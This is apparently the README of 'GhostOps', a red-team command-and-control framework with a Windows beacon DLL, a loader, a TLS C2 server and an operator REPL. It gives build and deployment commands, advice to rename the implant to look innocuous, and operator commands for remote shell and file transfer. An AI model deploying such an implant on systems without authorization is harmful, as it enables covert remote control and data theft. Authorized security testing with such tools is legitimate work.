# GhostOps - Command and Control Framework

> **Legal** — For authorized security assessments and educational research only.
> Use against systems without explicit written permission is illegal.
> The authors accept no liability for misuse.

---

## Features

| Capability | Detail |
|---|---|
| Persistent shell | Stateful `cmd.exe` session — env vars, CWD preserved across tasks |
| File transfer | Upload and download with base64 transport |
| Host profiling | OS, arch, integrity level, adapters, domain info on check-in |
| Sleep / jitter | Configurable interval with percentage jitter |
| Reconnect backoff | Exponential back-off (up to 5 min) when C2 is unreachable |
| TLS | Self-signed cert auto-generated at startup; BYO cert supported |
| Auth | API key required on all operator connections |
| Persistence | Optional JSON store — survives server restarts |
| Logging | Tee stdout to file with `-log` |

---

## Components

| | Language | Output | Role |
|---|---|---|---|
| `beacon/` | C (mingw) | `beacon.dll` | Windows implant |
| `loader/` | C (mingw) | `loader.exe` | Executes the beacon DLL |
| `server/` | Go | `server` | TLS C2 listener + operator API |
| `client/` | Go | `client` | Operator REPL |

---

## Requirements

```bash
# Debian / Ubuntu — cross-compiler for Windows targets
sudo apt install mingw-w64

# Go 1.21+
# https://go.dev/dl/
```

---

## Building

```bash
# Server and client
make

# Beacon DLL — C2 host and port are baked in at compile time
make beacon BEACON_HOST=<ip> BEACON_PORT=<port>

# Loader EXE — loads beacon.dll from the same directory
make loader

# Full implant build example
make beacon loader BEACON_HOST=10.10.14.5 BEACON_PORT=443
```

Artifacts land in `build/`:

```
build/
├── server
├── client
├── beacon.dll
└── loader.exe
```

> **Note** — Rename `loader.exe` and `beacon.dll` to matching names before deployment.
> The loader resolves the DLL by name at runtime (`beacon.dll` by default).
> Override at compile time: `make loader BEACON_DLL=update.dll`

---

## Quickstart

**1 — Start the server**

```
$ ./build/server

┏┓┓     ┏┓
┃┓┣┓┏┓┏╋┃┃┏┓┏
┗┛┛┗┗┛┛┗┗┛┣┛┛
          ┛

  HTTPS Listener  0.0.0.0:443
  Operator API    127.0.0.1:9090
  API Key         a3f8c1d2e4b5f6a7c8d9e0f1a2b3c4d5
```

Optional flags:

```
-c2-host   C2 bind address      (default 0.0.0.0)
-c2-port   C2 port              (default 443)
-op-host   Operator bind        (default 127.0.0.1)
-op-port   Operator port        (default 9090)
-api-key   Static API key       (auto-generated if omitted)
-tls-cert  TLS certificate PEM  (auto-generated if omitted)
-tls-key   TLS private key PEM  (auto-generated if omitted)
-store     Persistence file     (in-memory only if omitted)
-log       Log file path        (stdout only if omitted)
```

**2 — Deploy the implant** on the target

```
loader.exe          # executes beacon.dll from the same directory
```

Or directly via rundll32:

```
rundll32.exe beacon.dll,BeaconMain
```

**3 — Connect with the client**

```
$ ./build/client -key a3f8c1d2e4b5f6a7c8d9e0f1a2b3c4d5
```

Optional flags:

```
-host   Operator API host  (default 127.0.0.1)
-port   Operator API port  (default 9090)
-key    API key            (required)
```

---

## Operator Commands

```
beacons                     list all active beacons
use <id>                    select a beacon by ID
info                        show full beacon detail
shell <cmd>                 run a shell command (persistent session)
sleep <ms> [jitter%]        update sleep interval
kill                        terminate the beacon process
download <remote> [local]   pull a file from the target
upload <local> <remote>     push a file to the target
tasks [-a]                  show results  (-a = all, default = unseen only)
back                        deselect beacon
help                        show command list
exit                        quit
```

---

## Architecture

```
Operator
   │
   │  HTTPS + API key  (:9090)
   ▼
┌──────────────────────────────────────┐
│  server                              │
│  ├── C2  listener  :443  (HTTPS)     │
│  │     POST /checkin                 │
│  │     GET  /tasks/<id>              │
│  │     POST /result                  │
│  └── Operator API  :9090 (HTTPS)     │
│        GET  /beacons[/<id>]          │
│        POST /task                    │
│        GET  /results/<id>            │
└────────────────┬─────────────────────┘
                 │  HTTPS  (:443)
                 ▼
┌──────────────────────────────────────┐
│  loader.exe → beacon.dll             │
│  ├── context.c    host profiling     │
│  ├── checkin.c    initial check-in   │
│  ├── loop.c       sleep / poll       │
│  ├── tasks.c      task dispatch      │
│  ├── shell.c      persistent shell   │
│  └── file.c       file transfer      │
└──────────────────────────────────────┘
```

---

## Project Structure

```
.
├── beacon/
│   ├── include/beacon.h      shared types and declarations
│   └── src/
│       ├── main.c            DLL entry point (BeaconMain export)
│       ├── context.c         host profiling
│       ├── checkin.c         HTTPS check-in
│       ├── loop.c            sleep / poll loop with jitter
│       ├── tasks.c           task polling, JSON parsing, dispatch
│       ├── shell.c           persistent cmd.exe pipe
│       └── file.c            base64 file upload / download
├── loader/
│   └── main.c               LoadLibrary + GetProcAddress stub
├── client/
│   ├── main.go
│   └── internal/
│       ├── banner/           startup banner
│       ├── display/          terminal colour and table helpers
│       ├── models/           shared data models
│       └── repl/             REPL loop and command handlers
├── server/
│   ├── main.go              TLS setup, auth middleware, dual listeners
│   ├── banner/              startup banner
│   ├── handlers/
│   │   ├── c2.go            beacon-facing endpoints
│   │   └── operator.go      operator-facing endpoints
│   └── store/
│       └── store.go         beacon store, task queues, persistence
├── Makefile
└── README.md
```

---

## Known Limitations

GhostOps Community is intentionally scoped. The following are not implemented:

- Encrypted / malleable HTTP profiles
- Sleep obfuscation or in-memory evasion
- AMSI / ETW patching
- EDR unhooking or process injection
- SOCKS5 proxy / pivoting
- Native `ps` / `ls` shortcuts (use `shell tasklist` / `shell dir`)
- Multi-operator session isolation
- BOF (Beacon Object File) support

Detection by a mature EDR on a monitored network should be expected.
Advanced capabilities are available in **GhostOps Pro**.